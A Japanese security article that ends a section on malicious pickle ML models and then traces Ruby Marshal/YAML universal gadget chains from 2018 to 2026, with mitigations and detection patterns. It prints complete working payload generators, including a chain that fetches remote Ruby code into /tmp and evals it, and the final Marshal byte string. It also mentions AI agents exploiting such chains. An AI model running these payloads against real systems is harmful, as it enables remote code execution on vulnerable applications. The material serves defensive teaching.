PickleBall 自身が明言する限界は正直で重要だ。PickleBall は「**任意 callable の import・invoke**」という強力なプリミティブを奪うが、**許可された callable を想定外の順序・引数で組み合わせる攻撃（return-to-libc やコード再利用に類する手口）までは防げない**。現時点でそうした攻撃は観測されていないが、「許可リストに入った正規部品だけで悪さができないか」は未解決の研究課題として残る。また静的解析は Python の動的性ゆえに**健全（sound）にも完全（complete）にもなりきれない**（過大近似＝余分に許可、過小近似＝正当を取りこぼし）。PickleBall は allowed imports と allowed invocations を分離し、かつ lazy enforcement を入れることでこれらを緩和している。

> 出典: PickleBall: Secure Deserialization of Pickle-based Machine Learning Models — https://arxiv.org/abs/2508.15987

---

### まとめ：ML モデルは「未署名の実行可能ファイル」として扱う

2本の研究から、防御側が持ち帰るべき教訓を整理する。

1. **蔓延の実態**：Hugging Face のモデルファイルの **59%（研究1）／リポジトリの ~44.9%（研究2）** が pickle 系の危険形式。pickle モデルを含むリポジトリは**月間 21 億回超**ダウンロードされ、Meta・Google・Microsoft・NVIDIA・Intel を含む 500 以上のモデルが pickle のみで配布されている。ある研究では悪意モデルのアップロードが**前年比 5 倍に増加**。危険形式は「レガシーだから消える」どころか増えている。
2. **実害は現実**：研究1 は実在する **14 件の悪意モデル**（うち 9 件がリバースシェル）を発見。「理論上の脆弱性」ではなく、攻撃者が検知回避まで試行している実運用の攻撃面だ。ペイロードには**システム指紋採取・認証情報窃取・リバースシェル**が確認されている。
3. **既存防御の限界を知る**：
   - **ハブ純正スキャナ／デニーリスト**（picklescan, ModelScan）は pickle 系しか見ず、リストにない callable・間接呼び出し・複数 `STOP` などで回避され、**62%（研究1）を見逃す**。過信禁物。
   - **SafeTensors** は根本解だが、テンソル以外を保存できず後方互換で pickle が残る。
   - **weights-only unpickler**（PyTorch 2.6 以降デフォルト）は悪意を100%止めるが、**15.4% の人気リポジトリで正当なモデルが読めなくなる**。無効化されると元の木阿弥。
4. **前進する防御**：**PickleBall** のように「ライブラリのソースから許可リストを自動生成し、遅延適用で運用性を保つ」アプローチが、安全性（悪意 100% 阻止）と実用性（良性 79.8% 読み込み）を両立させつつある。ただし code-reuse 型の残存攻撃面は未解決。

実務的な推奨は多層防御に尽きる。**(1) 可能な限り SafeTensors を使う／要求する。(2) pickle モデルは信頼できる発行元だけを、隔離・サンドボックス環境で読み込む。(3) `torch.load` は `weights_only=True`（PyTorch 2.6 以降デフォルト）を維持し、無効化するモデルは特に警戒する。(4) スキャナの警告は「無いより増し」程度に受け止め、単独の防御線にしない。** 学習済みモデルは、便利な数値データではなく**署名検証のない実行可能ファイル**だ——この一点を組織の常識にすることが、AI サプライチェーン防御の出発点になる。

## Rubyユニバーサルガジェットチェーンの系譜

Rubyの `Marshal.load` や `YAML.load`（内部で使う Psych）は、シリアライズされたデータを読み込むときに、単にデータを復元するだけでなく **クラスを実体化し、復元用のコールバックメソッドを呼ぶ**。この「クラスを実体化してメソッドを呼ぶ」という性質が、攻撃者にとっての足がかりになる。復元処理の途中で呼ばれるメソッドを起点（トリガー）として、標準ライブラリに元から存在するクラスのメソッドを数珠つなぎに呼び出していき、最終的に `Kernel.system` や `eval` のような「任意コード実行の出口（sink：入力が最終的に実行・解釈される危険な代入先）」へ制御を到達させる。この一連の連鎖を **ガジェットチェーン**と呼ぶ。

とりわけ重要なのが **ユニバーサル**（universal）という言葉だ。アプリ独自のクラスや追加 gem に依存せず、**Ruby 標準ライブラリ（rubygems や net/protocol など、Ruby をインストールすれば必ず入っているコード）だけ**でチェーンが完結するものを指す。ユニバーサルなチェーンが存在すると、「信頼できないデータを `Marshal.load`/`YAML.load` に渡している」という一点さえ満たせば、対象アプリのコードを一切知らなくても RCE（リモートコード実行）に至れてしまう。だからこそ、この系譜を理解することは「なぜ untrusted なデータに `Marshal.load` を使ってはいけないのか」を骨の髄まで納得するための最良の教材になる。

この節では、2018年の elttam による最初のユニバーサルチェーンから、2021年の William Bowling（devcraft）／Staaldraad による Ruby 2.x–3.x 対応チェーン、そして2026年の elttam による Ruby 4.0 チェーンまで、**約13年にわたる攻防の系譜**を、なぜ各世代が壊れ、次の世代がどう生き延びたのかという「仕組みレベルの理由」とともに追う。

> ⚠️ **注意（スコープ）**: 本節はすべて防御目的の解説である。掲載するペイロードは各原典で公開済みの技術的事実を、防御側が検知・パッチ判断・設計判断に活用するために引用したものであり、実在サービスや本番環境への無許可検証を推奨するものではない。

### 系譜の全体像（年表）

elttam の Ruby 4.0 記事は、13年に及ぶこの分野の年表を整理している。防御側にとって年表が重要なのは、「自分のRubyバージョンに対して、どの世代のチェーンが刺さるのか（＝どのパッチが効くのか）」を判断する材料になるからだ。

| 年 | 出来事 | 意味 |
| --- | --- | --- |
| 2013 | Hailey Somerville による Rails RCE とバグトラッカー開示 | Ruby デシリアライゼーション RCE の黎明 |
| 2016 | joernchen の Phrack 記事（Rails 攻撃） | 手法の体系化 |
| 2018 | **elttam（Luke Jahnke）**が Ruby 2.x 向け最初のユニバーサルチェーンを公開 | 標準ライブラリだけで RCE できることを実証 |
| 2019 | CVE-2019-5420 ほか、YAML.load 系の複数チェーン | 適用範囲の拡大 |
| 2021 | **William Bowling（devcraft）／Staaldraad** が Ruby 2.x–3.x ユニバーサルチェーンを公開 | 2018年チェーンが 2.7.2 で壊れた後の「復活」 |
| 2022–2024 | 各種の改良・洗練 | ガジェットの入れ替え合戦 |
| 2024年11月 | Luke Jahnke による Ruby 3.4 チェーン | RubyGems の対策コミットを回避 |
| 2026年8月 | **elttam** による Ruby 4.0 チェーン（AI エージェントによる in-the-wild 悪用を受けて公開） | `eval` sink を使う新世代 |

この年表から読み取るべき最重要の教訓は、elttam 自身が結論で述べている次の一文に集約される。

> ガジェットを取り除くことは攻撃コストを上げるが、**能力（capability）そのものを取り除くわけではない**。

つまり「新しいガジェットが見つかるたびに RubyGems にパッチが当たる」といういたちごっこが13年続いており、パッチは根本解決ではない。根本解決は「信頼できないデータに `Marshal.load`/`YAML.load` を使わない」ことだけ、という点を最初に押さえておこう。

### 第1世代（2018）: elttam の最初のユニバーサルチェーン

2018年、elttam の Luke Jahnke は、Ruby 標準ライブラリの `Gem::StubSpecification` などを使い、`Marshal.load` だけで RCE できる最初のユニバーサルチェーンを公開した。これは「アプリ側に特別なクラスがなくても、Ruby さえあれば刺さる」という点で衝撃的だった。

この第1世代チェーンは、後述するように **Ruby 2.7.2 以降で壊れた**（RubyGems 側の実装変更により、`Gem::StubSpecification` を経由するルートが使えなくなった）。Staaldraad は自身の記事でこれを次のように明言している。

> オリジナルの elttam / Luke Jahnke のガジェットは、その後パッチが当たり、**Ruby 2.7.2 以降では動作しなくなった**。

したがって防御側の第一の観点は、「2.7.2 未満の古い Ruby を使い続けているなら、第1世代チェーンの標的である」ということだ。ただし後述の第2世代が 2.x 全域をカバーするため、単にバージョンを上げるだけでは不十分である点に注意。

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain
> 出典: Staaldraad — Universal RCE with Ruby YAML.load (updated) — https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

### 第2世代（2021）: devcraft / Staaldraad の Ruby 2.x–3.x チェーン

第1世代が 2.7.2 で壊れた後、William Bowling（devcraft）が **Ruby 2.0 〜 3.0.2 の全域**で動く新しいユニバーサルチェーンを発見した。Staaldraad はほぼ同時期にこれを YAML.load 版として再構成・検証した。この世代の中核は、`Gem::StubSpecification` の代わりに **`net/protocol` 由来の `Net::BufferedIO` のログ機構**と **`Gem::RequestSet#resolve`** を組み合わせた点にある。

#### チェーンの流れ（なぜ動くのか）

devcraft のチェーンは、次の順序でメソッドを連鎖させる。各ステップの「なぜ呼ばれるのか」が重要なので、仕組みごと説明する。

1. **`Gem::Requirement#marshal_load`（トリガー）** — `Marshal.load` は、`marshal_dump`/`marshal_load` を定義したクラスを復元するとき、復元直後に `marshal_load` を自動的に呼ぶ。ここが「入口（entry point）」になる。実装は次の通り。

   ```ruby
   def marshal_load(array)
     @requirements = array[0]
     fix_syck_default_key_in_requirements
   end
   ```

   `@requirements` に攻撃者が仕込んだオブジェクトが代入され、続く `fix_syck_default_key_in_requirements` の内部処理が `@requirements` を走査する。ここで攻撃者制御下のオブジェクトのメソッドが呼ばれ始める。

2. **`Gem::Package::TarReader#each`** — `@requirements` に仕込んだ `TarReader` の走査が始まり、tar エントリを1つずつ読もうとする。

3. **`Net::BufferedIO#read` → ログ出力** — tar の読み取りは内部の I/O オブジェクトを介する。ここに `Net::BufferedIO` を差し込むと、読み取りのたびに「reading 512 bytes...」のようなデバッグログを書き出そうとする。ログ出力は `@debug_output << msg` という形で行われる。**この `<<`（追記）演算子の呼び出し先を攻撃者がすり替えられる**のが鍵だ。

4. **`Net::WriteAdapter#<<`** — `@debug_output` に `Net::WriteAdapter` を仕込んでおくと、`<<` が呼ばれた瞬間に内部で次のように任意メソッドを呼び出す。

   ```ruby
   # Net::WriteAdapter の本質
   @socket.__send__(@method_id, str)
   ```

   `@socket` と `@method_id` は攻撃者が自由に設定できる。つまり「任意オブジェクトの任意メソッドを、ログ文字列 `str` を引数に呼ぶ」という汎用ブリッジになっている。

5. **`Gem::RequestSet#resolve`** — 上の `@socket` に `Gem::RequestSet`、`@method_id` に `:resolve` を仕込む。`Gem::RequestSet` は `@sets` と `@git_set` を完全に制御でき、`resolve()` がこれらを未制御のまま下流に渡す。

6. **`Kernel.system`（出口）** — `@sets` に **もう1つの `Net::WriteAdapter`**（`@socket = Kernel`, `@method_id = :system`）を仕込み、`@git_set` に実行したいコマンド文字列（例 `"id"`）を入れておく。これにより最終的に `Kernel.system("id")` に相当する呼び出しへ到達し、RCE が成立する。

ここで巧妙なのは、Staaldraad と devcraft が指摘する **「二段構えの引数」**だ。ログ経由の第1の `WriteAdapter` に渡る引数（`str`）はログ文字列であり攻撃者が完全には制御できない。しかし `Gem::RequestSet#resolve` をもう一段挟むことで、`@git_set`（＝完全に制御できる第2の引数）を実際のコマンドとして流し込める。この「制御できない引数を捨てて、制御できる引数で実行する」二段構えが、第2世代の設計上の要点である。

#### Marshal 版のジェネレータ（原典）

devcraft が公開した、ペイロードを組み立てる Ruby コードは次の通り。`allocate`（`initialize` を呼ばずに空のインスタンスを作る）と `instance_variable_set`（インスタンス変数を直接ねじ込む）を多用して、正規の初期化を経ずに危険な内部状態を組み立てているのが特徴だ。

```ruby
# 出典コード（devcraft）: Ruby 2.7.2 での動作例
Gem::SpecFetcher
Gem::Installer

module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# 出口: Kernel.system をラップ
wa1 = Net::WriteAdapter.new(Kernel, :system)

# 第2引数を制御するための RequestSet
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")   # ← 実行コマンド

# resolve を呼ぶための WriteAdapter
wa2 = Net::WriteAdapter.new(rs, :resolve)

# tar エントリ（eof? などをごまかす）
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

# ログ出力先を wa2 にすり替えた BufferedIO
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
Marshal.load(payload)  # => sh -c id 相当が実行される
```

配列の先頭に `Gem::SpecFetcher` と `Gem::Installer` を置いているのは、**それらのクラス定数を `Marshal.load` に解決させることで RubyGems の autoload を発火させ、チェーンで使う下流クラス（`Net::WriteAdapter` など）を確実にロードさせる**ためだ。クラスを名前として1つ登場させるだけで、Ruby がそのクラスを（`require` 相当で）読み込む——この「定数解決による副作用」は後の世代でも繰り返し使われる重要テクニックである。

#### YAML.load 版（Staaldraad）

Staaldraad は同じチェーンを YAML で表現した。`YAML.load`（Psych）は Ruby オブジェクトを表す `!ruby/object:` タグに出会うと、そのクラスを実体化し `init_with`（または `yaml_initialize`）を呼ぶため、Marshal と同じトリガーに到達する。

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id           # ← 実行コマンド
         method_id: :resolve
```

このYAMLは、先ほどのMarshalジェネレータが `instance_variable_set` で組み立てていた **オブジェクトグラフをそのまま宣言的に書き下したもの**だと理解すると分かりやすい。`socket:`/`method_id:` が `Net::WriteAdapter` の内部変数、`git_set: id` が実行コマンドに対応する。`!ruby/module 'Kernel'` は「モジュール `Kernel` そのもの」を値として指定し、`Kernel.system` を呼べるようにしている。

Staaldraad は「Ruby 2.0〜3.0 全域で RCE を確認し、以前のバージョンを狙ったパッチを無効化した」と報告している。

#### 影響バージョンとパッチ

- **影響範囲**: Ruby 2.0 〜 3.0.2（`Marshal.load`/`YAML.load` に untrusted データを渡す場合）
- **修正**: Ruby 3.0.3 以降で、rubygems 側コミット（141c2f4）と ruby 本体コミット（2b17d2f）により、このチェーンの経路が塞がれた。

つまり第2世代チェーンに対しては **Ruby 3.0.3 以降へのアップデートが直接の緩和**になる。ただし、これも「そのチェーンを塞いだ」だけで、後述の第3・第4世代が新バージョンを標的に登場することになる。

> 出典: devcraft (William Bowling) — Universal Deserialisation Gadget for Ruby 2.x-3.x — https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
> 出典: Staaldraad — Universal RCE with Ruby YAML.load (updated) — https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

### 第3世代（2024）: Luke Jahnke の Ruby 3.4 チェーンと、それが壊された理由

2024年11月、Luke Jahnke は Ruby 3.4 を標的とする新チェーンを公開した。これは `Gem::Version#marshal_load` の緩さや `to_s_wrapper`、`Gem::Source::Git`／`Gem::Resolver::GitSet` に実行ファイル名を保持させる `exec_gadget` などを利用していた。

しかしこのチェーンは Ruby 3.4.0 に取り込まれた **2つの RubyGems コミットによって明示的に潰された**。elttam の記事はこれを具体的に挙げている。防御側にとっては「パッチが特定のガジェットをどう無効化するか」の好例なので、仕組みを押さえておきたい。

- **コミット `62b49465f8`**: `Gem::Version#marshal_load` に **型チェック**を追加。バージョン文字列として不正なもの（"wrong version string" 検証に引っかかるもの）を弾くようにし、`to_s_wrapper` を悪用する経路を封じた。
- **コミット `89ad04db86`**: `Gem::Source::Git` と `Gem::Resolver::GitSet` から **実行ファイル名をインスタンス変数として保持する処理を削除**し、`exec_gadget` を消した。

要するに「攻撃に使われていた具体的なガジェット（緩い型のフィールドや、コマンド名を溜め込むフィールド）を、RubyGems 側でピンポイントに削った」わけだ。これで第3世代チェーンは Ruby 3.4 では動かなくなった。

だが——ここが13年間繰り返されてきたパターンだ——**`Gem::SpecFetcher` と `call_url_and_create_folder` は手つかずのまま残った**。この「消し忘れ」が次の第4世代の入口になる。

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain

### 第4世代（2026）: elttam の Ruby 4.0 チェーン — `eval` sink への転回

2026年8月、elttam は Ruby 4.0 を標的とする新チェーンを公開した。背景として、AI エージェントによる in-the-wild（実環境での）悪用が観測されたことが挙げられている。この世代は、それまでの `Kernel.system` を出口にする発想から離れ、**ファイルをダウンロードして書き込み → `Gem::Specification.load` 経由で `eval` させる**という、より根深い設計に転回した点が特徴だ。

#### 動作環境（バージョン依存）

- **動作する**: Ruby 3.3 〜 Ruby 4.0.6（公開時点の最新）
- **動作しない**: Ruby 3.3 より前（必要なガジェットが存在しない）

第2・第3世代が古いバージョンを標的にしていたのに対し、第4世代は **むしろ新しい 3.3〜4.0 系を標的にする**。つまり「新しいバージョンにすれば安全」という直感は成り立たない。バージョンによって刺さるチェーンが違うだけで、`Marshal.load` を untrusted データに使う限り、どこかの世代が必ず刺さる。

#### チェーンの流れ（なぜ動くのか）

第4世代のチェーンは、大きく「**ファイルを書き込ませるダウンロードガジェット**」と「**そのファイルを `eval` させる実行ガジェット**」の2つのフェーズからなる。elttam が示す流れは次の通り。

1. **`Gem::SpecFetcher`（autoload トリガー）** — 「このクラスが何か仕事をするからではなく、`Marshal.load` が定数を解決しなければならないから」チェーンで使う下流クラス群が autoload される。第2世代と同じ「定数解決の副作用」テクニックだ。

2. **`Time` オブジェクトの復元 → `time_mload`（C実装）** — 攻撃者は細工した `zone`（タイムゾーン）フィールドを持つ `Time` を復元させる。`Time._load`（内部の C 実装 `time_mload`）は zone 値に対して `to_s` ではなく **`to_str`** を呼ぶ。そしてこの C 実装は `rb_rescue` を使っており、**呼び出し中に発生した例外を握りつぶす**。この「例外を捨てる」性質が後で効いてくる（ダウンロードが失敗してもチェーン全体は継続できる）。

3. **`Gem::URI::Generic#to_str → to_s`（メソッドブリッジ）** — zone に仕込んだ `Gem::URI::Generic` は `to_str` を `to_s` にエイリアスしており、`to_s` は内部で `@port` フィールドに対して `to_s` を呼ぶ。これにより「`Time` が呼んだ `to_str`」を「`@port` に仕込んだ次のガジェットの `to_s` 呼び出し」へと橋渡しできる。

4. **ダウンロードガジェット `call_url_and_create_folder`** — `@port` に、`Gem::RequestSet::Lockfile` + `Gem::RequestSet` + `Gem::Source` + `Gem::Resolver::IndexSpecification` を組み合わせたオブジェクトグラフを仕込む。これが最終的に `call_url_and_create_folder` を呼び、攻撃者サーバから **deflate 圧縮された Ruby コードを HTTPS で取得**し、URL に埋め込んだディレクトリトラバーサル（`/../../../../...tmp/`）を使って、狙った場所（例 `/tmp/quick/Marshal.4.8/name-.gemspec`）へ **ファイルとして書き込む**。

5. **例外の握りつぶし** — ダウンロードガジェットは目的（ファイル書き込み）を果たした後、処理が途中でエラーになる。しかしステップ2で述べた `time_mload` の `rb_rescue` が例外を捨てるため、**チェーン全体は死なずに続行**する。ここが第4世代の巧妙さで、「副作用（ファイル書き込み）だけ起こして、失敗は無視する」設計になっている。

6. **`Gem::StubSpecification#hash`（Hashキーとしての自動呼び出し）** — `Marshal.load` は Hash を復元するとき、キーオブジェクトの `hash` メソッドを自動的に呼ぶ（ハッシュテーブルの再構築に必要だから）。攻撃者は `Gem::StubSpecification` を **Hash のキー**として配置しておく。復元完了時にその `hash()` が呼ばれ、内部で `Gem::Specification.load(@loaded_from)` が呼ばれる。

7. **`Gem::Specification.load → eval`（出口）** — `Gem::Specification.load` は指定ファイルを読み、その中身を `eval` に渡す。実装の核心は次の通り。

   ```ruby
   code = Gem.open_file(file, "r:UTF-8:-", &:read)
   spec = eval code, binding, file
   ```

   `@loaded_from` にステップ4で書き込んだファイルのパスを指定しておけば、**ダウンロードした Ruby コードが `eval` されて実行**される。これが第4世代の最終 sink である。

まとめると、第4世代は「`Kernel.system` に文字列を渡す」のではなく、「**攻撃者コードをファイルに落として `eval` する**」という二段構えを取る。`Time` の C 実装（`to_str` を呼び、例外を捨てる）と、`Hash` 復元時に `hash` が呼ばれる Ruby の言語仕様そのものを利用しているため、elttam は「これを取り除くには言語のセマンティクスを根本的に変える必要がある」と評している。ここが「ガジェットを消しても能力は消えない」という結論の技術的裏付けだ。

#### 前提条件（防御側が着目すべき点）

elttam が挙げる第4世代の成立条件は、そのまま防御・検知の観点になる。

- 対象が **攻撃者サーバへ HTTPS で外向き通信**できること（→ egress 制限が緩和になる）
- 対象が **`/tmp` に書き込み**できること
- 標準ライブラリ以外の gem は不要／アプリ固有コードも不要／事前のファイル状態も不要

つまり「外向き通信を絞る」「一時ディレクトリの書き込みを制限する」といったハードニングは、このチェーンの成立を難しくする補助的な緩和になる。ただし根本緩和にはならない点に注意。

#### ジェネレータ（原典）

elttam が公開したペイロード生成コードは次の通り。各ガジェットが前述のどのステップに対応するかをコメントで補った。

```ruby
Gem::SpecFetcher # 定数解決で autoload を発火（ステップ1）

# ステップ4: ファイルをダウンロードして /tmp に書き込むガジェット
def call_url_and_create_folder(url)
  uri = Gem::URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", url + "?")
  uri.instance_variable_set("@port",
    "/../../../../../../../../../../../../../../../tmp/"  # トラバーサルで書込先を制御
  )
  uri.instance_variable_set("@user", "any")
  uri.instance_variable_set("@password", "any")

  source = Gem::Source.allocate
  source.instance_variable_set("@uri", uri)
  source.instance_variable_set("@update_cache", true)

  index_spec = Gem::Resolver::IndexSpecification.allocate
  index_spec.instance_variable_set("@name", "name")
  index_spec.instance_variable_set("@source", source)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [index_spec])

  lockfile = Gem::RequestSet::Lockfile.new('','','')
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies", [])

  return lockfile
end

# ステップ3: to_str -> to_s のブリッジ（@port の to_s を呼ばせる）
def to_str_calls_to_s(to_s_sink)
  uri = Gem::URI::Generic.allocate
  uri.instance_variable_set("@port", to_s_sink)
  return uri
end

# ステップ7: 書き込んだファイルを eval させるガジェット
def eval_file_gadget(filename)
  stub_specification = Gem::StubSpecification.allocate
  stub_specification.instance_variable_set(:@loaded_from, filename)
  return stub_specification
end

# いったん普通の Object として Time の内部レイアウトを模した placeholder を作る
time_placeholder = Object.new
time_placeholder.instance_variable_set("@offset_placeholder", 0)
time_placeholder.instance_variable_set(
  "@zone_placeholder",
  to_str_calls_to_s(call_url_and_create_folder("example.com/poc-id.rz"))
)

# ステップ6: Hash キーになったとき hash() が呼ばれるようにする
class Gem::StubSpecification
  def hash
    0
  end
end

placeholder_gadget_chain = Marshal.dump(
  [
    Gem::SpecFetcher,
    time_placeholder,
    {eval_file_gadget("/tmp/quick/Marshal.4.8/name-.gemspec") => nil}
  ]
)

# placeholder の Object バイト列を、本物の Time のバイト列へ差し替える
rce_gadget_chain = placeholder_gadget_chain.gsub(
  "o:\vObject\a:\x18@offset_placeholderi\x00:\x16@zone_placeholder",
  "Iu:\x09Time\x0d\x00\x00\x00\x80\x00\x00\x00\x00\x07:\x0boffseti\x05:\x09zone"
).b

puts rce_gadget_chain.inspect
```

このジェネレータで注目すべきは最後の `gsub` だ。`Time` を直接 `Marshal.dump` させるのは難しい（内部表現が特殊なため）ので、**まず普通の `Object` を使って全体のバイト列を組み立て、そのあと `Object` を表すバイト列を `Time` を表すバイト列に文字列置換する**という「バイナリ手術」を行っている。これは Marshal フォーマット（`04 08` から始まるバイナリ形式）の構造を熟知していないとできない高度なテクニックであり、`Marshal.load` を untrusted データに使うことが、いかに攻撃者に強力な自由度を与えるかを物語っている。

出来上がる最終ペイロード（Marshal バイナリ）は次の通り。防御側が WAF やログでこのようなバイト列の断片（`Gem::SpecFetcher`、`Gem::RequestSet::Lockfile`、`Gem::StubSpecification`、`/tmp/quick/Marshal.4.8/` など）を検知の手がかりにできる。

```ruby
"\x04\b[\bc\x15Gem::SpecFetcherIu:\tTime\r\x00\x00\x00\x80\x00\x00\x00\x00\a:\voffseti\x05:\tzoneo:\x16Gem::URI::Generic\x06:\n@porto:\x1EGem::RequestSet::Lockfile\n:\t@seto:\x14Gem::RequestSet\x06:\x15@sorted_requests[\x06o:&Gem::Resolver::IndexSpecification\a:\n@nameI\"\tname\x06:\x06ET:\f@sourceo:\x10Gem::Source\a:\t@urio:\x13Gem::URI::HTTP\v:\n@pathI\"\x06/\x06;\x10T:\f@schemeI\"\as3\x06;\x10T:\n@hostI\"\eexample.com/poc-id.rz?\x06;\x10T;\tI\"7/../../../../../../../../../../../../../../../tmp/\x06;\x10T:\n@userI\"\bany\x06;\x10T:\x0E@passwordI\"\bany\x06;\x10T:\x12@update_cacheT:\x12@dependencies[\x00:\x13@gem_deps_fileI\"\t/pwd\x06;\x10T:\x12@gem_deps_dirI\"\x06/\x06;\x10T:\x0F@platforms[\x00{\x06o:\eGem::StubSpecification\x06:\x11@loaded_fromI\")/tmp/quick/Marshal.4.8/name-.gemspec\x06;\x10T0"
```

> 出典: elttam — Ruby 4.0 Universal RCE Deserialization Gadget Chain — https://www.elttam.com/blog/ruby-4-0-universal-rce-deserialization-gadget-chain

### 世代間の比較と、そこから得る設計原則

| 世代 | 年 | 対象バージョン | トリガー | 中核ガジェット | 最終 sink |
| --- | --- | --- | --- | --- | --- |
| 第1 | 2018 | Ruby 2.x（〜2.7.1） | `Marshal.load` | `Gem::StubSpecification` 系 | コード実行 |
| 第2 | 2021 | Ruby 2.0〜3.0.2 | `Gem::Requirement#marshal_load` | `Net::BufferedIO` ログ + `Gem::RequestSet#resolve` + `Net::WriteAdapter` | `Kernel.system` |
| 第3 | 2024 | Ruby 3.4 | Marshal | `Gem::Version` 型緩さ + `exec_gadget` | コード実行 |
| 第4 | 2026 | Ruby 3.3〜4.0.6 | `Gem::SpecFetcher` autoload + `Time` の `time_mload` | ダウンロード + `Gem::StubSpecification#hash` | `Gem::Specification.load → eval` |

この表を縦に眺めると、防御側にとっての最重要の設計原則が浮かび上がる。

1. **「バージョンを上げれば安全」は誤り。** 各世代は異なるバージョン帯を標的にしており、第4世代はむしろ最新の 3.3〜4.0 を狙う。アップデートは「特定世代のチェーンを塞ぐ」緩和にはなるが、恒久対策ではない。

2. **RubyGems のパッチは「ガジェットの削除」であって「能力の削除」ではない。** 第3世代を潰した2つのコミット（`62b49465f8`／`89ad04db86`）が、`Gem::SpecFetcher` を残したために第4世代を生んだ事実が、それを端的に示す。標準ライブラリは巨大で、`Marshal.load` が任意クラスを実体化しメソッドを呼べる限り、新しいガジェットは見つかり続ける。

3. **根本対策は「信頼できないデータを `Marshal.load`／`YAML.load` に渡さない」ことのみ。** elttam の結論を再掲する。

   > ガジェットを取り除くことは攻撃コストを上げるが、能力そのものを取り除くわけではない。**信頼できないデータには、代わりにデータ専用フォーマットを使え。**

### 防御ガイド（実装上の指針）

以上の系譜を踏まえた、防御目的での具体的な指針をまとめる。

- **`Marshal.load`／`Marshal.restore` に外部由来データを絶対に渡さない。** クッキー・セッション・キャッシュ・キュー・アップロードファイルなど、少しでも攻撃者が触れる経路のデータをマーシャルで復元しない。信頼境界を越えるデータの受け渡しには JSON など **オブジェクトを実体化しないデータ専用フォーマット**を使う。
- **`YAML.load` ではなく `YAML.safe_load` を使う。** 現在の Psych では `YAML.load` は安全側（`safe_load` 相当）に寄せられてきているが、明示的に `safe_load` を使い、必要なクラスだけを `permitted_classes` でホワイトリスト指定する。`!ruby/object:` のような任意クラスタグを許可しない。
- **多層防御としてのハードニング。** 第4世代が「外向き HTTPS」と「`/tmp` への書き込み」を前提とする点を踏まえ、アプリの egress（外向き通信）を必要な宛先だけに絞り、一時ディレクトリの権限・実行可否を制限する。これらは成立を難しくする補助であり、根本対策の代替にはならない。
- **検知の手がかり。** ログや WAF で、Marshal バイナリの先頭 `\x04\x08` に続くクラス名文字列（`Gem::SpecFetcher`、`Gem::RequestSet`、`Net::WriteAdapter`、`Gem::StubSpecification` など）や、YAML の `!ruby/object:Gem::Requirement` / `Net::WriteAdapter` / `!ruby/module 'Kernel'` といったパターンを異常として捉える。ただし攻撃者はエンコードやバイト操作で回避しうるため、検知は補助と位置づける。
- **依存の最新化は「特定世代への緩和」として実施する。** Ruby と RubyGems を最新に保てば、既知の第1〜第3世代チェーンは塞げる。ただし第4世代のように新バージョンを狙うチェーンが存在するため、「最新化＝安全」と誤認しないこと。

最終的に、この13年の系譜が教えるのはただ一つ——**信頼できないバイト列を「Ruby オブジェクトとして復元」させた時点で、標準ライブラリという巨大な武器庫を攻撃者に開放している**、という事実である。復元をやめ、データとして受け取ることだけが、この武器庫の扉を閉じる方法だ。

## Rubyデシリアライゼーションの歴史と最新チェーン

Rubyにおけるデシリアライゼーション脆弱性は、単発のバグではなく「同じ設計欠陥が10年以上にわたって形を変えて再発し続けている」という点で特異な位置を占める。本節では、なぜRubyの標準シリアライズ機構（`Marshal`）が構造的にRCE（Remote Code Execution：リモートからの任意コード実行）を招きやすいのか、その仕組みを起点に、2013年の最初の報告から2024〜2025年のRuby 3.4向け最新チェーンまでの歴史を追い、実務で押さえるべき防御ポイントを整理する。

### なぜRubyのMarshalは危険なのか（仕組みレベルの理解）

`Marshal.load` は、Rubyオブジェクトをバイト列にシリアライズ／デシリアライズするための標準機能である。ここでいう「デシリアライズ」とは、保存・送信用のバイト列表現を、プログラムが直接操作できるメモリ上のオブジェクトに復元する処理を指す。問題は、このバイト列の中に「どのクラスの、どういう内部状態を持つオブジェクトを、どういう手順で復元するか」という指示そのものが含まれている点にある。

具体的には、`Marshal` フォーマットはオブジェクトの復元時に以下のいずれかのメソッドを**呼び出す**ことができる。

- `marshal_load`（Marshal専用のカスタム復元フック）
- `_load`（クラスメソッドとして定義されたカスタムローダー）
- `init_with`（YAMLとも共有される初期化フック）

